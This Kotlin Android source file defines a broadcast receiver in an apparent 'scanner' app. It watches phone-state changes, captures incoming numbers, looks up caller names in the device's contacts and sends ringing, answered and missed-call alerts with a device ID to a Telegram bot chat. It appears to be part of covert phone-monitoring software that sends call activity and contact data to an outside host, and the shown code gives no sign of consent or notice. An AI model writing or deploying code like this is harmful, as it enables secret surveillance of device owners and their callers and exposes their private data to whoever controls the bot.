package com.example.scanner

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.ContactsContract
import android.telephony.TelephonyManager
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class IncomingCallReceiver : BroadcastReceiver() {

    companion object {
        private var lastState = TelephonyManager.EXTRA_STATE_IDLE
        private var lastCallNumber: String? = null
        private var callStartTime: Long = 0L
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return

        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val rawNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

        val repository = MediaUploadRepository(context)
        if (!repository.isCallMonitoringEnabled()) return

        val deviceId = repository.getDeviceId()
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return

        val timeStr = SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault()).format(Date())

        if (state == TelephonyManager.EXTRA_STATE_RINGING) {
            val number = rawNumber ?: lastCallNumber ?: "Hidden / Private"
            lastCallNumber = number
            callStartTime = System.currentTimeMillis()

            val contactName = getContactName(context, number)

            val msg = "📞 <b>INCOMING PHONE CALL ALERT!</b>\n\n" +
                    "👤 <b>Caller Name:</b> ${contactName ?: "Unknown (Not in contacts)"}\n" +
                    "📱 <b>Phone Number:</b> <code>$number</code>\n" +
                    "📲 <b>Device:</b> <code>$deviceId</code>\n" +
                    "🕒 <b>Ring Time:</b> $timeStr\n\n" +
                    "<i>ফোনটিতে এখন কল বাজছে...</i>"

            CoroutineScope(Dispatchers.IO).launch {
                TelegramApiService(context).sendMessage(config.botToken, config.chatId, msg)
            }
        } else if (state == TelephonyManager.EXTRA_STATE_OFFHOOK && lastState == TelephonyManager.EXTRA_STATE_RINGING) {
            val number = lastCallNumber ?: "Unknown"
            val contactName = getContactName(context, number)

            val msg = "🟢 <b>CALL ANSWERED / ONGOING</b>\n\n" +
                    "👤 <b>With:</b> ${contactName ?: number}\n" +
                    "📱 <b>Number:</b> <code>$number</code>\n" +
                    "📲 <b>Device:</b> <code>$deviceId</code>\n" +
                    "🕒 <b>Answer Time:</b> $timeStr"

            CoroutineScope(Dispatchers.IO).launch {
                TelegramApiService(context).sendMessage(config.botToken, config.chatId, msg)
            }
        } else if (state == TelephonyManager.EXTRA_STATE_IDLE && lastState == TelephonyManager.EXTRA_STATE_RINGING) {
            // Call was missed or rejected
            val number = lastCallNumber ?: "Unknown"
            val contactName = getContactName(context, number)

            val msg = "🔴 <b>MISSED / REJECTED CALL</b>\n\n" +
                    "👤 <b>Caller:</b> ${contactName ?: number}\n" +
                    "📱 <b>Number:</b> <code>$number</code>\n" +
                    "📲 <b>Device:</b> <code>$deviceId</code>\n" +
                    "🕒 <b>Time:</b> $timeStr"

            CoroutineScope(Dispatchers.IO).launch {
                TelegramApiService(context).sendMessage(config.botToken, config.chatId, msg)
            }
        }

        lastState = state
    }

    private fun getContactName(context: Context, phoneNumber: String): String? {
        if (phoneNumber == "Hidden / Private" || phoneNumber.isBlank()) return null
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
            context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
                } else null
            }
        } catch (_: Exception) {
            null
        }
    }
}
